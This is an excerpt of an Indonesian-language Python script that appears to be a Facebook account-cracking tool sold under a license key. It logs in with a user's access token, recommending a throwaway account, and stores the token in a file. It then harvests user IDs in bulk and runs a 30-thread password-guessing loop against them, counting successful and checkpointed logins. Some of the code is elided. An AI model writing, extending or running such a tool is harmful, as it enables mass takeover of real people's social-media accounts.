...
time.sleep(0.1)
os.system("clear")
print("  \033[44m\033[1;37m [✓] VALIDASI LICENSI ANDA    \x1b[0m ")
print(" \n\33[0;32m[✓] 🗣️ Jika Anda Belum Memiliki Licensinya\n[✓]Silakan Hubungi CS nya👇 \n")
print(" \n\33[0;32mKontak CS \33[37;1m: https://wa.me/6282151858918 ")

input("\n\33[37;1m[✓] * PUT YOUR LICENSI KEY RUN TOOLS 👇 -> Enter ")
Password = "HAJW-BEJS-NEJSN"

loop = 'true'
while (loop == 'true'):
    passcode = input("\033[41m\033[1;37m[✓] ☂️ ENTER TO LICENSI YOUR \x1b[0m \33[37;1m: ")
    if (passcode == Password):
            loop = 'false'
            time.sleep(5.0)
            print("\n 🎉 Hore Licensi Kamu Terdaftar ")
    else:
            exit("Licensi Kamu Kadarluwasa")
...
def banner():
	clear()
	wel = '# SELAMAT DATANG SUHU 😊'
	wel2 = mark(wel, style='green')
	sol().print(wel2)
	au='▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   +> YT : Mikasa\n█▄░▄█░▄▀▄░█▀▄▄▀█░▄▄▀█▄░▄█░▄▄▀█░█   +> Supoort : Acil\n██░██░█▄█░█░██░█░▀▀▄██░██░▀▀░█░█   +> Dev : Mikasa Ex\n█▀░▀█▄███▄██▄▄██▄█▄▄██▄██▄██▄█▄▄   +> Team X code\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀   +> WA : 6282151858918 '  # Jangan Di Ubah Ajg -> Kesalahan Code Bakal Merusak Program                                                                                                                                                                                              
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='INFORMASI DEVLOPER 🙏'))
...
def login_lagi():
	banner()
	sky = '# ☂️ LOGIN MENGGUNAKAN AKSES TOKEN.JANGN LUPA GUNAKAN AKUN TUMBAL ( RECOMENDED )'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'*'+x+'] Put Your Token : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# 🎉 Hore Login Suksesffully --> Semoga Tokennya Awet'
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# 🎉 HORE BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
...
# WORDLIST
def passwrd():
	ler = '# ☂️ PROSES DI MULAI +> TEKAN CTRL+Z UNTUK BERHENTI'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# ☂️ INGIN MENGECEK OPSI HASIL CRACK?'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s<-> Proses %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
